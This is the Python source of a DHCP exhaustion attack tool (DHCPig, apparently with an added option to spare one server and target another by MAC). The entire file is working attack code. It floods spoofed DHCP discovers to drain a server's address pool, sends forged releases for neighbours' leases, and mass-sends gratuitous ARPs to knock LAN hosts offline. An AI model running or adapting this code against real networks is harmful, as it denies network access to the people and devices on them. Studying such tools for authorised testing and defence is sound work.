#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
enhanced DHCP exhaustion attack.

Doc:
    http://github.com/kamorin/DHCPig


Usage:
    pig.py [-h -v -6 -1 -s -f -t -a -i -o -l -x -y -z -g -r -n -c -m -p] <interface>
  
Options:
    -h, --help                     <-- you are here :)
    -v, --verbosity                ...  0 ... no         (3)
                                        1 ... minimal
                                       10 ... default
                                       99 ... debug
                                       
    -6, --ipv6                     ... DHCPv6 (off, DHCPv4 by default)
    -1, --v6-rapid-commit          ... enable RapidCommit (2way ip assignment instead of 4way) (off)
    
    -s, --client-src               ... a list of client macs 00:11:22:33:44:55,00:11:22:33:44:56 (Default: <random>)
    -O, --request-options          ... option-codes to request e.g. 21,22,23 or 12,14-19,23 (Default: 0-80)
    
    -f, --fuzz                     ... randomly fuzz packets (off)

    -t, --threads                  ... number of sending threads (1)
    
    -a, --show-arp                 ... detect/print arp who_has (off)
    -i, --show-icmp                ... detect/print icmps requests (off)
    -o, --show-options             ... print lease infos (off)
    -l, --show-lease-confirm       ... detect/print dhcp replies (off)
    
    -g, --neighbors-attack-garp    ... knock off network segment using gratious arps (off)
    -r, --neighbors-attack-release ... release all neighbor ips (off)
    -n, --neighbors-scan-arp       ... arp neighbor scan (off)
    
    -x, --timeout-threads          ... thread spawn timer (0.4)
    -y, --timeout-dos              ... DOS timeout (8) (wait time to mass grat.arp)
    -z, --timeout-dhcprequest      ... dhcp request timeout (2)
    
    -c, --color                    ... enable color output (off)
    -p <ip_address>                ... The IP address of the DHCP server to protect.
    -m <mac_address>               ... The MAC address of the DHCP server to attack.
"""

from scapy.all import *
import string, binascii, signal, sys, threading, socket, struct, getopt
from sys import stdout



class Colors:
    class Palette:
        '''
        dummy, as python 2.5 does not support namedtuples
        '''
        black = None
        red = None
        green = None
        yellow = None
        blue = None
        purple = None
        cyan = None
        grey = None
#   forecolor
    endc = "\033[0m"
    black = "\033[30m"
    red = "\033[31m"
    green = "\033[32m"
    yellow = "\033[33m"
    blue = "\033[34m"
    purple = "\033[35m"
    cyan = "\033[36m"
    grey = "\033[37m"
#   back color
    background = Palette
    background.black = "\033[40m"
    background.red = "\033[41m"
    background.green = "\033[42m"
    background.yellow = "\033[43m"
    background.blue = "\033[44m"
    background.purple = "\033[45m"
    background.cyan = "\033[46m"
    background.grey = "\033[47m"

#   attribs
    bold = "\033[1m"
    underline = "\033[4m"
    blink = "\033[5m"
    invert = "\033[7m"

'''
Defaults
'''
conf.checkIPaddr = False
conf.iface = "lo"
conf.verb = False
SHOW_ARP = True
SHOW_ICMP = False
SHOW_DHCPOPTIONS = False
SHOW_LEASE_CONFIRM = False
MODE_IPv6 = False
MODE_FUZZ = False
DO_GARP = False
DO_RELEASE = False
DO_ARP = False
MAC_LIST = []
TIMEOUT={}
TIMEOUT['dos']=8    
TIMEOUT['dhcpip']=2
TIMEOUT['timer']=0.4
DO_COLOR = False 
COLORSCHEME = {'<--':Colors.green+"%s"+Colors.endc,
               '<-':Colors.blue+"%s"+Colors.endc,
               '->':Colors.cyan+"%s"+Colors.endc,
               '-->':Colors.grey+"%s"+Colors.endc,
               '?':Colors.yellow+"%s"+Colors.endc,
               'DEBUG':Colors.purple+"%s"+Colors.endc,
               'NOTICE': Colors.bold+Colors.red+"%s"+Colors.endc,
               'ERROR': Colors.bold+Colors.red+"%s"+Colors.endc,
               'WARNING': Colors.bold+Colors.yellow+"%s"+Colors.endc,
               None:'%s'}
MSGSCHEME = {'<--'      :"[<---] %s",   # inbound
             '-->'      :"[--->] %s",   # outpund
             '->'      :"[ -> ] %s",    # icmp / arp out
             '<-'      :"[ <- ] %s",    # icmp / arp in
             '?'        :"[ ?? ] %s",   
             'DEBUG'    :"[DBG ] %s",
             'NOTICE'   :"[ -- ] %s",
             'WARNING'  :"[ !! ] %s",
             'ERROR'    :"[XXXX] %s",
             }
MSGSCHEME_MIN = {'<--'  :"!",
             '-->'      :".",
             '->'       :":",
             '<-'       :";",
             '?'        :"?",
             'DEBUG'    :"D",
             'NOTICE'   :"N",
             'WARNING'  :"W",
             'ERROR'    :"E",
             }
DO_v6_RC = False
VERBOSITY = 3
THREAD_CNT = 1
THREAD_POOL = []
REQUEST_OPTS = range(80)
PI_IP=""
ROUTER_MAC=""

def checkArgs():
    global SHOW_ARP, SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT,SHOW_LEASE_CONFIRM,REQUEST_OPTS,PI_IP,ROUTER_MAC
    try:
        opts, args = getopt.getopt(sys.argv[1:], "haiolx:y:z:6fgrns:c1v:t:O:p:m:", ["help","show-arp","show-icmp",
                                                                      "show-options","timeout-threads=","timeout-dos=",
                                                                      "timeout-dhcprequest=", "neighbors-scan-arp",
                                                                      "neighbors-attack-release", "neighbors-attack-garp",
                                                                      "fuzz","ipv6","client-src=","color","v6-rapid-commit",
                                                                      "verbosity=","threads=", "show-lease-confirm","request-options=","pi-ip=","router-mac="])
    except getopt.GetoptError, err:
        # print help information and exit:
        print str(err)  # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-a", "--show-arp"):
            SHOW_ARP = False
        elif o in ("-i", "--show-icmp"):
            SHOW_ICMP = True
        elif o in ("-o", "--show-options"):
            SHOW_DHCPOPTIONS = True
        elif o in ("-l", "--show-lease-confirm"):
            SHOW_LEASE_CONFIRM = True
        elif o in ("-x", "--timeout-threads"):
            TIMEOUT['timer'] = float(a)
        elif o in ("-y", "--timeout-dos"):
            TIMEOUT['dos'] = float(a)
        elif o in ("-z", "--timeout-dhcprequest"):
            TIMEOUT['dhcpip'] = float(a)
        elif o in ("-6", "--ipv6"):
            MODE_IPv6 = True
        elif o in ("-f", "--fuzz"):
            MODE_FUZZ = True
        elif o in ("-g", "--neighbors-attack-garp"):
            DO_GARP = True
        elif o in ("-r", "--neighbors-attack-release"):
            DO_RELEASE = True
        elif o in ("-n", "--neighbors-scan-arp"):
            DO_ARP = True
        elif o in ("-s", "--client-src"):
            MAC_LIST = a.strip().split(",")
        elif o in ("-c", "--color"):
            DO_COLOR = True
        elif o in ("-1", "--v6-rapid-commit"):
            DO_v6_RC = True
        elif o in ("-v", "--verbosity"):
            VERBOSITY = int(a)
            if VERBOSITY >= 99:
                conf.verb = True
        elif o in ("-t", "--threads"):
            THREAD_CNT = int(a)
        elif o in ("-O", "--request-options"):
            REQUEST_OPTS = []
            for o in a.split(","):
                if "-" in o:
                    x = o.split("-")
                    if len(x) == 2:
                        REQUEST_OPTS += range(int(x[0]),int(x[1]))
                    else:
                        print "Error in option - request-options"
                        usage()
                        exit()
                else:
                    REQUEST_OPTS.append(int(o))
#                   REQUEST_OPTS = [int(o) for o in REQUEST_OPTS]
        elif o in ("-m"):
            ROUTER_MAC = a
            LOG("router mac is " + a)
        elif o in ("-p"):        
            PI_IP = a
            LOG("pi ip is " + a)
        else:
            assert False, "unhandled option"
    if len(args) == 1:
        if WINDOWS:
            conf.iface = IFACES.dev_from_name(args[0])
        else:
            conf.iface = args[0]
    else:
        usage()
        sys.exit(2)
        
    if conf.verb:
        print """---------------------[OPTIONS]-----------
        IPv6                            %s
        fuzz                            %s

        DONT_SHOW_ARP                   %s
        SHOW_ICMP                       %s
        SHOW_DHCPOPTIONS                %s
        SHOW_LEASE_CONFIRMATION         %s
        
        REQUEST_DHCP_Options            %s

        timeout-threads                 %s
        timeout-dos                     %s
        timeout-dhcprequest             %s

        neighbors-attack-garp           %s
        neighbors-attack-release        %s
        neighbors-scan-arp              %s
        
        neighbors-scan-arp              %s
        
        color                           %s
-----------------------------------------
        """%(MODE_IPv6, MODE_FUZZ, SHOW_ARP, SHOW_ICMP, SHOW_DHCPOPTIONS, SHOW_LEASE_CONFIRM, repr(REQUEST_OPTS),
             TIMEOUT['timer'], TIMEOUT['dos'], TIMEOUT['dhcpip'],
             DO_GARP, DO_RELEASE, DO_ARP, repr(MAC_LIST), DO_COLOR)


def LOG(message=None, type=None):
    if VERBOSITY <= 0:
        return
    elif VERBOSITY == 1:
#       minimal verbosity ...   dot style output
        if type in MSGSCHEME_MIN:
            message = MSGSCHEME_MIN[type]
            if DO_COLOR and type in COLORSCHEME:
                message = COLORSCHEME[type]%message
            stdout.write("%s"%message)
            stdout.flush()
    else:
        if type in MSGSCHEME:
            message = MSGSCHEME[type]%message
        if DO_COLOR and type in COLORSCHEME:
            message = COLORSCHEME[type]%message
        if MODE_FUZZ:
            stdout.write("[FUZZ] %s\n"% (message))
        else:
            stdout.write("%s\n"% (message))
        stdout.flush()


def signal_handler(signal, frame):
    LOG(type="NOTICE", message= ' -----  ABORT ...  -----')
    i = 0
    for t in THREAD_POOL:
        t.kill_received = True
        LOG(type="DEBUG", message= 'Waiting for Thread %d to die ...'%i)
        i+=1
    sys.exit(0)

# Necessary Network functions not included in scapy
#
def randomMAC():
    global MAC_LIST
    if len(MAC_LIST)>0:
        curr = MAC_LIST.pop()
        MAC_LIST = [curr]+MAC_LIST
        return curr
    mac = [ 0xDE, 0xAD, 
        random.randint(0x00, 0x29),
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))


def toNum(ip):
    "convert decimal dotted quad string to long integer"
    return struct.unpack('L',socket.inet_aton(ip))[0]


def get_if_net(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return ltoa(net)
    warning("No net address found for iface %s\n" % iff)


def get_if_msk(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return ltoa(msk)
    warning("No net address found for iface %s\n" % iff)


def get_if_ip(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return addr
    warning("No net address found for iface %s\n" % iff)


def calcCIDR(mask):
    mask = mask.split('.')
    bits = []
    for c in mask:
        bits.append(bin(int(c)))
    bits = ''.join(bits)
    cidr = 0
    for c in bits:
        if c == '1': cidr += 1
    return str(cidr)


def unpackMAC(binmac):
    mac = binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
    return ':'.join(blocks)


##########################################################
#
#  IPv6 Packet crafting
#

"""
    protocol specific stuff

c2s -> solicit
s2c -> advertise 
c2s -> request
s2c -> reply

"""

def v6_build_ether(mac):
    IPv6mcast="33:33:00:01:00:02"
    #IPv6LL="fe80::20c:29ff:fef8:a1c8"
    IPv6LL = [addr for addr,y,intf in in6_getifaddr() if intf==conf.iface]
    if len(IPv6LL)>0:
        IPv6LL=IPv6LL[0]
    else:
        LOG(type="NOTICE",message="Could not determine v6 Link-Local Address")
        exit()
    IPv6bcast="ff02::1:2"
    IPv6DHCP_CLI_Port=546
    IPv6DHCP_SRV_Port=547
    ethead=Ether(src=mac,dst=IPv6mcast)/IPv6(src=IPv6LL,dst=IPv6bcast)/UDP(sport=IPv6DHCP_CLI_Port,dport=IPv6DHCP_SRV_Port)
    return ethead

def v6_build_discover(mac,trid=None,options=[23,24]):
    ethead=v6_build_ether(mac)
    trid=trid or random.randint(0x00,0xffffff)
    cli_id=DHCP6OptClientId(duid=DUID_LLT(lladdr=mac,timeval=int(time.time())))
    if DO_v6_RC:
        dhcp_discover = ethead/DHCP6_Solicit(trid=trid)/cli_id/DHCP6OptIA_NA(iaid=0xf)/DHCP6OptRapidCommit()/DHCP6OptElapsedTime()/DHCP6OptOptReq(reqopts=options)
    else:
        dhcp_discover = ethead/DHCP6_Solicit(trid=trid)/cli_id/DHCP6OptIA_NA(iaid=0xf)/DHCP6OptElapsedTime()/DHCP6OptOptReq(reqopts=options)
    return dhcp_discover

def v6_build_request(p_advertise,iaid=0xf,trid=None,options=[23,24]):
    trid=trid or random.randint(0x00,0xffffff)
    ethead=v6_build_ether(p_advertise[Ether].dst)
    srv_id=DHCP6OptServerId(duid=p_advertise[DHCP6OptServerId].duid)
    cli_id=p_advertise[DHCP6OptClientId]
    iana=DHCP6OptIA_NA(ianaopts=p_advertise[DHCP6OptIA_NA].ianaopts, iaid=iaid)
    dhcp_request=ethead/DHCP6_Request(trid=trid)/cli_id/srv_id/iana/DHCP6OptElapsedTime()/DHCP6OptOptReq( reqopts=options)
    return dhcp_request

def v6_build_release(p_advertise,mac,iaid=0xf,trid=None):
    trid=trid or random.randint(0x00,0xffffff)
    ethead=v6_build_ether(p_advertise[Ether].dst)
    srv_id=DHCP6OptServerId(duid=p_advertise[DHCP6OptServerId].duid)
    cli_id=DHCP6OptClientId(duid=DUID_LLT(lladdr=mac,timeval=int(time.time())))
    iana=DHCP6OptIA_NA(ianaopts=p_advertise[DHCP6OptIA_NA].ianaopts, iaid=iaid)
    dhcp_request=ethead/DHCP6_Release(trid=trid)/cli_id/srv_id/iana/DHCP6OptElapsedTime()
    return dhcp_request

def sendPacket(pkt):
    if MODE_FUZZ:
        # only fuzz: UDP with payload of UDP (DHCP messages)
        pkt[UDP] = fuzz(pkt[UDP])
    #pkt = [pkt]*100
    sendp(pkt, iface=conf.iface)


def neighbors():
    """
    ARP and create map of LAN neighbors 
    """
    global dhcpsip, subnet, nodes
    nodes = {}
    if MODE_IPv6:
        LOG(type="WARNING", message="IPv6 - neighbors() not supported at this point ")
    else:
        myip = get_if_ip(conf.iface)
        LOG(type="DEBUG", message="NEIGHBORS:  net = %s  : msk =%s  : CIDR=%s"%(get_if_net(conf.iface),get_if_msk(conf.iface),calcCIDR(get_if_msk(conf.iface))))
        pool = Net(myip + "/" + calcCIDR(get_if_msk(conf.iface)))
        for ip in pool:
            LOG(type="<--", message="ARP: sending %s " %ip)
            arp_request=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, psrc=myip)
            sendPacket(arp_request)
            time.sleep(0.005)


def release():
    """
        send release for our neighbors
    """
    global dhcpsmac,dhcpsip,nodes,p_dhcp_advertise
    if MODE_IPv6 and p_dhcp_advertise and DHCP6OptServerId in p_dhcp_advertise:
        LOG(type="WARNING", message= " IPv6 - release() is not supported and supposed to be experimental - feel free to add code! ")
        return
        # we are releaseing client IDs!
        m=randomMAC()
        v6_build_release(p_dhcp_advertise,mac)
    else:
        LOG(type="NOTICE", message= "***  Sending DHCPRELEASE for neighbors ")
        #iterate over all nodes and release their IP from DHCP server
        for cmac,cip in nodes.iteritems():
            myxid = random.randint(1, 900000000)
            LOG(type="-->", message= "Releasing %s - %s serverip=%s  xid=%i"%(cmac,cip,dhcpsip,myxid))
            dhcp_release =  IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid)/\
                            DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
            sendPacket(dhcp_release)
            if conf.verb: LOG(type="DEBUG", message= "%r"%dhcp_release )


def garp():
    """ 
        knock nodes offline
    """
    global dhcpsip, subnet
    if MODE_IPv6:
        LOG(type="NOTICE", message="IPv6 - gratious_arp() not supported at this point ")
        return
        pool=Net6(dhcpsip+"/"+calcCIDR(subnet))
        for ip in pool:
            m=randomMAC()
            # craft packet  Ether/IPv6/ICMPv6_ND_NA/ICMPv6NDOptDstLLAddr
            LL_ScopeALL_Multicast_Address="ff02::1"
            arpp = Ether(src=m,dst="33:33:00:00:00:01")/IPv6(src=ip,dst=LL_ScopeALL_Multicast_Address)/ICMPv6ND_NA(tgt=ip,R=0)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")
            sendPacket(arpp)
            LOG(type="-->", message= "v6_ICMP_NeighborDiscovery - knock offline  %s"%ip)
            if conf.verb: LOG(type="DEBUG", message="%r"%arpp)
    else:
        pool = Net(dhcpsip+"/"+calcCIDR(subnet))
        for ip in pool:
            m = randomMAC()
            arpp = Ether(src=m, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m, psrc=ip, hwdst="00:00:00:00:00:00", pdst=ip)
            sendPacket(arpp)
            LOG(type="-->", message="Gratious_ARP - knock offline %s"%ip)
            if conf.verb: LOG(type="DEBUG", message="%r"%arpp)


class send_dhcp(threading.Thread):
    """
    loop and send Discovers
    """
    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False

    def run(self):
       global TIMEOUT, dhcpdos, REQUEST_OPTS
       while not self.kill_received and not dhcpdos:
            m = randomMAC()
            myxid = random.randint(1, 900000000)
            mymac = get_if_hwaddr(conf.iface)
            hostname = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
            # Mac OS options order to avoid DHCP fingerprinting
            myoptions = [
                ("message-type", "discover"),
                ("param_req_list", chr(1),chr(121),chr(3),chr(6),chr(15),chr(119),chr(252),chr(95),chr(44),chr(46)),
                ("max_dhcp_size",1500),
                ("client_id", chr(1), mac2str(m)),
                ("lease_time",10000),
                ("hostname", hostname),
                ("end",'00000000000000')
            ]
            if MODE_IPv6:
                dhcp_discover = v6_build_discover(m,trid=myxid,options=REQUEST_OPTS)
                LOG(type="-->", message="v6_DHCP_Discover [cid:%s]"%(repr(str(dhcp_discover[DHCP6OptClientId].duid))))
            else:
                #dhcp_discover = Ether(src=mymac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid,flags=0xFFFFFF)/DHCP(options=myoptions)
                #dhcp_discover = Ether(src=mymac,dst="30:5a:3a:cc:5f:50")/IP(src="0.0.0.0",dst="192.168.2.252")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid,flags=0xFFFFFF)/DHCP(options=myoptions)
                dhcp_discover = Ether(src=mymac,dst=ROUTER_MAC)/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid,flags=0xFFFFFF)/DHCP(options=myoptions)
                LOG(type="-->", message="DHCP_Discover")
            sendPacket(dhcp_discover)
            if TIMEOUT['timer']>0: 
                time.sleep(TIMEOUT['timer'])


class sniff_dhcp(threading.Thread):
    """
    sniff DHCP Offers and ACK
    """
    def __init__(self):
        threading.Thread.__init__(self)
        if MODE_IPv6:
            self.filter = "icmp6 or (udp and src port 547 and dst port 546)"
        else:
            self.filter = "arp or icmp or (udp and src port 67 and dst port 68)"
        self.kill_received = False
        self.dhcpcount = 0

    def run(self):
        global dhcpdos
        while not self.kill_received and not dhcpdos:
            sniff(filter=self.filter, prn=self.detect_dhcp, store=0, timeout=3, iface=conf.iface)
            if self.dhcpcount>0 : LOG(type="NOTICE", message="timeout waiting on dhcp packet count %d"%self.dhcpcount)
            self.dhcpcount += 1
            if not MODE_FUZZ and self.dhcpcount==5: dhcpdos = True
          
    def detect_dhcp(self, pkt):
        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise, SHOW_LEASE_CONFIRM,REQUEST_OPTS
        if MODE_IPv6:
            if DHCP6_Advertise in pkt:
                self.dhcpcount = 0
                if DHCP6OptIAAddress in pkt and DHCP6OptServerId in pkt:
                    p_dhcp_advertise = pkt
                    myip = pkt[DHCP6OptIAAddress].addr
                    sip = repr(pkt[DHCP6OptServerId].duid.lladdr)
                    cip = repr(pkt[DHCP6OptClientId].duid.lladdr)
                    myhostname = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
            
                    LOG(type="<--", message=("v6 ADVERTISE FROM [%s] -> [%s] - LEASE: IPv6[%s]"%(sip,cip,myip)))
                    if SHOW_DHCPOPTIONS:
                        b = pkt[DHCP6_Advertise]
                        b=str(b.show)
                        for h in b.split("|<"):
                            LOG(type="DEBUG",message="\t* %s"%h)
                    
                    if not DO_v6_RC:
                        # we dont need to request the address if we're using rapid commit mode (2 message: solict / reply)
                        dhcp_req=v6_build_request(pkt,options=REQUEST_OPTS)
                        sendPacket(dhcp_req)
                        LOG(type="-->", message= "v6 REQUEST ACK IPv6[%s]\n"%myip)

            elif SHOW_LEASE_CONFIRM and DHCP6_Reply in pkt :
                myip=pkt[DHCP6OptIAAddress].addr
                sip=repr(pkt[DHCP6OptServerId].duid.lladdr)
                cip=repr(pkt[DHCP6OptClientId].duid.lladdr)
                LOG(type="<-", message=("v6 DHCP REPLY FROM [%s] -> [%s] - LEASE: IPv6[%s]"%(sip,cip,myip)))
            elif SHOW_ICMP and ICMPv6ND_NS in pkt and ICMPv6NDOptSrcLLAddr in pkt :
                LOG(type="<-", message= "v6 ICMP REQUEST FROM [%s] -> [%s]"%(pkt[ICMPv6NDOptSrcLLAddr].lladdr,pkt[ICMPv6ND_NS].tgt)) 
        else:
            if DHCP in pkt:
                if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
                    self.dhcpcount=0
                    dhcpsip = pkt[IP].src
                    dhcpsmac = pkt[Ether].src
                    for opt in pkt[DHCP].options:
                        if opt[0] == 'subnet_mask':
                            subnet=opt[1]
                            break
                    mymac = get_if_hwaddr(conf.iface)
                    myip=pkt[BOOTP].yiaddr
                    sip=pkt[BOOTP].siaddr
                    localxid=pkt[BOOTP].xid
                    localm=unpackMAC(pkt[BOOTP].chaddr)
                    myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
                    LOG(type="<--", message= "DHCP_Offer   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+localm+"]")
                    if sip == PI_IP:
                        LOG(type="INFO", message = "skipped protected server") 
                    else:
                        if SHOW_DHCPOPTIONS:
                            b = pkt[BOOTP]
                            LOG(type="DEBUG", message=  "\t* xid=%s"%repr(b.xid))
                            LOG(type="DEBUG", message=  "\t* CIaddr=%s"%repr(b.ciaddr)  )      
                            LOG(type="DEBUG", message=  "\t* YIaddr=%s"%repr(b.yiaddr)  )
                            LOG(type="DEBUG", message=  "\t* SIaddr=%s"%repr(b.siaddr)  )
                            LOG(type="DEBUG", message=  "\t* GIaddr=%s"%repr(b.giaddr)  )
                            LOG(type="DEBUG", message=  "\t* CHaddr=%s"%repr(b.chaddr)  )
                            LOG(type="DEBUG", message=  "\t* Sname=%s"%repr(b.sname)  )
                            for o in pkt[DHCP].options:
                                if isinstance(o,str):
                                    if o=="end": break        #supress spam paddings :)
                                    LOG(type="DEBUG", message=  "\t\t* "+repr(o)  )
                                else:
                                    LOG(type="DEBUG", message=  "\t\t* %s\t%s"%(o[0],o[1:])  )    
                        
                        dhcp_req = Ether(src=mymac,dst=ROUTER_MAC)/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid,flags=0xFFFFFF)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
                        LOG(type="-->", message= "DHCP_Request "+myip)
                        sendPacket(dhcp_req)
                elif SHOW_LEASE_CONFIRM and pkt[DHCP] and pkt[DHCP].options[0][1] == 5:
                    myip=pkt[BOOTP].yiaddr
                    sip=pkt[BOOTP].siaddr
                    LOG(type="<-", message= "DHCP_ACK   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]")
            
            elif ICMP in pkt:
                if pkt[ICMP].type==8:
                    myip=pkt[IP].dst
                    mydst=pkt[IP].src
                    if SHOW_ICMP: LOG(type="<-", message= "ICMP_Request "+mydst+" for "+myip )
                    icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
                    if conf.verb: 
                        LOG(type="DEBUG", message=  "%r"%icmp_req )
                    sendPacket(icmp_req)

            elif SHOW_ARP and ARP in pkt:
                myip = pkt[ARP].pdst
                mydst = pkt[ARP].psrc
                if pkt[ARP].op ==1:        #op=1 who has, 2 is at
                    LOG(type="DEBUG", message="ARP_Request " + myip + " from " + mydst)
                elif pkt[ARP].op ==2:
                    myip=pkt[ARP].psrc
                    myhw=pkt[ARP].hwsrc
                    LOG(type="<-", message= "ARP_Response %s : %s" %(myip, myhw))
                    nodes[myhw] = myip


def main():
    """
    """
    global THREAD_POOL,dhcpdos,dhcpsip,dhcpsmac,subnet,nodes,THREAD_CNT,p_dhcp_advertise
    
    checkArgs()
    LOG(type="NOTICE", message= "[INFO] - using interface %s"%conf.iface)
    signal.signal(signal.SIGINT, signal_handler)
    dhcpsip=None
    dhcpsmac=None
    subnet=None
    nodes={}
    dhcpdos=False 
    p_dhcp_advertise = None # contains dhcp advertise pkt once it is received (base for creating release())

    LOG(type="DEBUG",message="Thread %d - (Sniffer) READY"%len(THREAD_POOL))
    t=sniff_dhcp()
    t.start()
    THREAD_POOL.append(t)
    
    for i in range(THREAD_CNT):
        LOG(type="DEBUG",message="Thread %d - (Sender) READY"%len(THREAD_POOL))
        t=send_dhcp()
        t.start()
        THREAD_POOL.append(t)

    fail_cnt=20
    while dhcpsip==None and fail_cnt>0:
        time.sleep(TIMEOUT['dhcpip'])
        LOG(type="?", message= "\t\twaiting for first DHCP Server response")
        fail_cnt-=1
    
    if fail_cnt==0:
        LOG(type="NOTICE", message= "[FAIL] No DHCP offers detected - aborting")
        signal_handler(signal.SIGINT,fail_cnt)

    if DO_ARP: neighbors()
    if DO_RELEASE: release()
       
    while not dhcpdos:
        time.sleep(TIMEOUT['dos'])
        LOG(type="?", message= " \t\twaiting for DHCP pool exhaustion...")
    
    if DO_GARP:   
        LOG(type="NOTICE", message= "[INFO] waiting %s to mass grat.arp!"%TIMEOUT['dos'])
        time.sleep(TIMEOUT['dos'])
        garp()
    LOG(type="NOTICE", message= "[DONE] DHCP pool exhausted!")
  
def usage():
    print __doc__
    
if __name__ == '__main__':
    main()
    print "\n"
